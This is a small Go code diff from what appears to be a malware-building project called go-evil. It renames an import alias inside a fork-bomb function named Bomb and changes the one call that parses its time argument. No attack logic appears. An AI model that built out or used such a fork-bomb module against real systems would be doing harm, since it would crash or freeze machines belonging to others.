@@ -3,7 +3,7 @@ package fork
 import (
 	"fmt"
 
-	tools "github.com/s9rA16Bf4/Go-tools"
+	gotools "github.com/s9rA16Bf4/Go-tools"
 	"github.com/s9rA16Bf4/go-evil/utility/structure"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/functions"
 	"github.com/s9rA16Bf4/go-evil/utility/structure/json"
@@ -22,7 +22,7 @@ func Bomb(value string, data_object *json.Json_t) []string {
 
 	time := arr.Get(0)
 
-	time_i := tools.StringToInt(time)
+	time_i := gotools.StringToInt(time)
 	if time_i == -1 {
 		notify.Error(fmt.Sprintf("Failed to convert '%s' to an integer", time), "bombs.fork_bomb()", 1)
 	}
